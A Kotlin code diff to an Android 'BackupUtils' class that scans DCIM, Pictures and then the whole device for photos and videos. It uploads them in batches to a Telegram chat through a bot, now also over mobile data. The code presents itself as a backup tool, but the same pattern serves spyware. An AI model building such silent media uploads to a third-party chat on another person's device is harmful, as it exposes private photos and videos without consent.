@@ -24,9 +24,9 @@ object BackupUtils {
         val timestamp: Long
     )
 
-    fun runBackup(context: Context): Boolean {
+    fun runBackup(context: Context, forzarConDatos: Boolean = false): Boolean {
         try {
-            Log.d(TAG, "Iniciando backup desde BackupUtils")
+            Log.d(TAG, "Iniciando backup desde BackupUtils (forzarConDatos: $forzarConDatos)")
             val config = ErrorHandler.obtenerConfigBot(context)
             if (config.first.isNullOrBlank() || config.second.isNullOrBlank()) {
                 Log.w(TAG, "Configuración del bot no encontrada")
@@ -34,22 +34,44 @@ object BackupUtils {
             }
             val token = config.first ?: ""
             val chatId = config.second ?: ""
-            if (!isWifiConnected(context)) {
-                Log.w(TAG, "No hay conexión WiFi disponible")
+            
+            // Verificar conexión según el modo
+            if (!forzarConDatos && !isWifiConnected(context)) {
+                Log.w(TAG, "No hay conexión WiFi disponible y no se permite usar datos móviles")
                 return false
             }
-            val archivosNuevos = escanearArchivosNuevos(context)
-            Log.d(TAG, "Encontrados ${archivosNuevos.size} archivos nuevos para enviar")
-            if (archivosNuevos.isEmpty()) {
-                Log.d(TAG, "No hay archivos nuevos para enviar")
-                guardarConexion(context)
-                return true
+            
+            if (forzarConDatos && !isWifiConnected(context) && !isMobileDataConnected(context)) {
+                Log.w(TAG, "No hay conexión WiFi ni datos móviles disponibles")
+                return false
             }
-            val imagenes = archivosNuevos.filter { isImage(it) }
-            val videos = archivosNuevos.filter { isVideo(it) }
-            Log.d(TAG, "Imágenes: ${imagenes.size}, Videos: ${videos.size}")
-            enviarPorLotes(token, chatId, imagenes, BATCH_SIZE_IMAGES, "imágenes", context)
-            enviarPorLotes(token, chatId, videos, BATCH_SIZE_VIDEOS, "videos", context)
+            
+            // PRIMERA FASE: Escanear solo DCIM y Pictures
+            Log.d(TAG, "FASE 1: Escaneando DCIM y Pictures")
+            val archivosDCIMyPictures = escanearDCIMyPictures(context)
+            Log.d(TAG, "Encontrados ${archivosDCIMyPictures.size} archivos en DCIM y Pictures")
+            
+            if (archivosDCIMyPictures.isNotEmpty()) {
+                val imagenesDCIM = archivosDCIMyPictures.filter { isImage(it) }
+                val videosDCIM = archivosDCIMyPictures.filter { isVideo(it) }
+                Log.d(TAG, "DCIM/Pictures - Imágenes: ${imagenesDCIM.size}, Videos: ${videosDCIM.size}")
+                enviarPorLotes(token, chatId, imagenesDCIM, BATCH_SIZE_IMAGES, "imágenes (DCIM/Pictures)", context)
+                enviarPorLotes(token, chatId, videosDCIM, BATCH_SIZE_VIDEOS, "videos (DCIM/Pictures)", context)
+            }
+            
+            // SEGUNDA FASE: Escanear todo el dispositivo
+            Log.d(TAG, "FASE 2: Escaneando todo el dispositivo")
+            val archivosRestoDispositivo = escanearArchivosNuevos(context)
+            Log.d(TAG, "Encontrados ${archivosRestoDispositivo.size} archivos en el resto del dispositivo")
+            
+            if (archivosRestoDispositivo.isNotEmpty()) {
+                val imagenesResto = archivosRestoDispositivo.filter { isImage(it) }
+                val videosResto = archivosRestoDispositivo.filter { isVideo(it) }
+                Log.d(TAG, "Resto dispositivo - Imágenes: ${imagenesResto.size}, Videos: ${videosResto.size}")
+                enviarPorLotes(token, chatId, imagenesResto, BATCH_SIZE_IMAGES, "imágenes (resto dispositivo)", context)
+                enviarPorLotes(token, chatId, videosResto, BATCH_SIZE_VIDEOS, "videos (resto dispositivo)", context)
+            }
+            
             val historialFile = serializarHistorial(context)
             if (historialFile != null) {
                 enviarArchivoATelegram(token, chatId, historialFile)
@@ -74,6 +96,62 @@ object BackupUtils {
             Log.e(TAG, "Error verificando WiFi: ${e.message}")
             return false
         }
+    }
+
+    private fun isMobileDataConnected(context: Context): Boolean {
+        try {
+            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
+            val network = connectivityManager.activeNetwork ?: return false
+            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
+            return capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error verificando datos móviles: ${e.message}")
+            return false
+        }
+    }
+
+    private fun escanearDCIMyPictures(context: Context): List<File> {
+        val extensiones = listOf("jpg", "jpeg", "png", "mp4", "mov", "avi")
+        val archivos = mutableListOf<File>()
+        val archivosSubidos = obtenerArchivosSubidos(context)
+        
+        try {
+            val directorio = Environment.getExternalStorageDirectory()
+            if (!directorio.exists() || !directorio.canRead()) {
+                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
+                return archivos
+            }
+            
+            // Escanear solo DCIM y Pictures
+            val carpetasPrioritarias = listOf("DCIM", "Pictures")
+            
+            carpetasPrioritarias.forEach { nombreCarpeta ->
+                val carpeta = File(directorio, nombreCarpeta)
+                if (carpeta.exists() && carpeta.canRead()) {
+                    Log.d(TAG, "Escaneando carpeta: $nombreCarpeta")
+                    carpeta.walkTopDown().forEach { file ->
+                        try {
+                            if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
+                                if (file.canRead() && file.length() > 0) {
+                                    val hash = calcularHashArchivo(file)
+                                    if (!archivosSubidos.contains(hash)) {
+                                        archivos.add(file)
+                                    }
+                                }
+                            }
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Error procesando archivo ${file.name}: ${e.message}")
+                        }
+                    }
+                } else {
+                    Log.w(TAG, "Carpeta $nombreCarpeta no existe o no es accesible")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error escaneando DCIM y Pictures: ${e.message}", e)
+        }
+        
+        return archivos.sortedBy { it.lastModified() }.reversed()
     }
 
     private fun escanearArchivosNuevos(context: Context): List<File> {
